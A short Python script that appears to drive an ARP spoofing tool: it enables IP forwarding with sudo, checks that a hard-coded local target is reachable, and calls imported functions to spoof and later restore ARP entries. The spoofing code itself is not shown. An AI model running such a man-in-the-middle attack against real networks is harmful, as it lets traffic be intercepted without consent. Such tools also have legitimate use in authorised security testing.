from sub import CollectData,functions,logo
import subprocess


class Main:
    def __init__(self):
        self.interface = None
        self.targetIP = None
        self.ipfowrard = True

    def arpSpoof(self):
        logo.Logo().logo()
        if(self.interface !=None and self.targetIP !=None):
            if(self.ipfowrard == True):
                try:
                    subprocess.run(['sudo', 'tee', '/proc/sys/net/ipv4/ip_forward'], input=b'1', check=True)
                    print("IP forwarding enabled.")
                except subprocess.CalledProcessError as e:
                    print("Error enabling IP forwarding:", e)

            check_if_target_available = CollectData.CollectData().check_target_available(self.interface, self.targetIP)
            if(check_if_target_available ==True):
                try:
                    functions.MainFunctions().arpSpoof(self.interface, self.targetIP)
                except KeyboardInterrupt:
                    print("[+] Restoring..Please wait")
                    functions.MainFunctions().stopARP(self.interface, self.targetIP)
            else:
                print("Target is not Available")
                sys.exit()
        else:
            print("Interface and TargetIP required")
                
            

    def run(self):
        self.interface = "eth0"
        self.targetIP = "192.168.1.5"
        self.arpSpoof()
        
        


m = Main()
m.run()
